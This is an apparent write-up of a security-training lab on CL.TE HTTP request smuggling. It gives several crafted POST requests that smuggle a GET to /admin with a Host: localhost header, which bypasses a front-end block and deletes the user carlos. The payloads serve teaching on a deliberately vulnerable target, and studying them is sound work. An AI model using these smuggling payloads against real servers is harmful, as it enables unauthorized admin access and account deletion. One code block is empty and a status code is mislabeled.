# Exploiting HTTP request smuggling to bypass front-end security control, CL.TE vulnerability
* This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at `/admin`, but the front-end server blocks access to it.
    * To solve the lab, smuggle a request to the back-end server that access the admin panel and delete the user _carlos_
### 1. Capture the request from the web root and modify it
```http
POST / HTTP/1.1
Host: ac2c1f111ec0bd4ac0e117b8002d00fe.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X


```
* It returns 410 Unauthorized since only local users can access the Admin interfaces

![18](https://user-images.githubusercontent.com/53956303/156475476-21208cb8-3f2b-4546-94b4-6f73d08bed44.png)
### 2. Modify Host header to loaclhost
```http

```
* The reqeust was blocked with 403 Forbidden due to the second reqeust's Host header conflicitng with the smuggled Host header in the first request.

![19](https://user-images.githubusercontent.com/53956303/156476322-cc9d8f26-c0af-43ad-92a0-e3ec795e1f8b.png)
### 3. Modify the parameter
```http
POST / HTTP/1.1
Host: ac2c1f111ec0bd4ac0e117b8002d00fe.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=


```
* When the request is sent twice, the attacker can access the admin panel.

![20](https://user-images.githubusercontent.com/53956303/156476709-3403b094-ad54-414c-b80f-0a3b504e83fc.png)
### 4. Modify the request to delete the target user account
```http
POST / HTTP/1.1
Host: ac2c1f111ec0bd4ac0e117b8002d00fe.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 142
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```
* As a result, the target user is deleted and the lab is solved.

![21](https://user-images.githubusercontent.com/53956303/156477286-599590cc-9985-4db9-a29e-f2f50bbae6c3.png)
